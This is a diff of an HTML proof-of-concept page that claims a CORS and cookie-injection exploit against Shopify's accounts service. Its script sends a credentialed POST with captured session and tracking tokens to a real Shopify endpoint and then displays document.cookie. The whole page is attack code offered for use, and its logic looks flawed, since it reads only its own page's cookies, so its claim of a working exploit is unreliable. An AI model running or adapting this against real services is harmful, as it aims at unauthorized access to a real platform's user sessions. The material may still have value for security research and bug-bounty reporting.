@@ -1,26 +1,69 @@
 <!DOCTYPE html>
 <html>
 <body>
-<h1>Shopify Cookie Injection PoC</h1>
+<h1>Shopify CORS + Cookie Injection PoC</h1>
 <pre id="output">Running exploit...</pre>
 <script>
 (async () => {
     try {
-        // Step 1 — Send the exact request body you saw in DevTools
+        // REPLACE THIS BODY with the exact one from your successful curl/DevTools capture
+        const bodyData = {
+            "multiTrackToken": "f4291301-ed52-41ab-883d-c0a20e6e25f2",
+            "sessionToken": "087bcec9-5495-484e-b94c-ae850702d7ee",
+            "enableActiveConsent": false,
+            "enableProtoEventForwarding": false,
+            "events": [
+                {
+                    "schemaId": "website_client_page_view/2.14",
+                    "payload": {
+                        "page_view_token": "e6e6a567-06b7-4329-aff7-96c9d38e4242",
+                        "user_locale": "en-US",
+                        "url": "https://accounts.shopify.com/select?rid=d7be4e63-2dd6-4bb7-a0c8-1090e3e225da",
+                        "domain": "accounts.shopify.com",
+                        "path": "/select",
+                        "url_hash": "",
+                        "canvas_height": 726,
+                        "canvas_width": 1918,
+                        "viewport_height": 726,
+                        "viewport_width": 1918,
+                        "version": "4.3.1",
+                        "site_environment": "production",
+                        "application": "identity-dux",
+                        "handle": "select",
+                        "soft_navigation": false,
+                        "canonical_url": "https://accounts.shopify.com/select"
+                    },
+                    "options": { "convertEventCase": false },
+                    "metadata": {
+                        "eventCreatedAtMs": 1754204602436,
+                        "clientMessageId": "d31a8911-6bf5-48f4-b051-992ede6f6d53"
+                    }
+                },
+                {
+                    "userLanguage": "en-US",
+                    "url": "https://accounts.shopify.com/select?rid=d7be4e63-2dd6-4bb7-a0c8-1090e3e225da",
+                    "referrer": "https://admin.shopify.com/",
+                    "pageViewToken": "e6e6a567-06b7-4329-aff7-96c9d38e4242",
+                    "siteEnvironment": "production"
+                }
+            ]
+        };
+
+        // Send request to vulnerable endpoint
         const res = await fetch("https://accounts.shopify.com/.well-known/dux", {
             method: "POST",
-            credentials: "include", // send Shopify cookies
-            headers: { "Content-Type": "application/x-www-form-urlencoded" },
-            body: "RenderableItem=%2Fshow%2F3%2Ffjnfjrtyj7qztrwnm0dvsberpybnvz"
+            credentials: "include",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(bodyData)
         });
 
-        // Step 2 — Wait for cookies to be set
+        // Wait for cookies to be set, then read them
         setTimeout(() => {
             const cookies = document.cookie;
             document.getElementById("output").textContent =
                 "HTTP Status: " + res.status + "\n\n" +
                 "Cookies for this domain:\n" + cookies;
-        }, 500); // slight delay to ensure cookies are written
+        }, 800);
     } catch (err) {
         document.getElementById("output").textContent = "Error: " + err;
     }
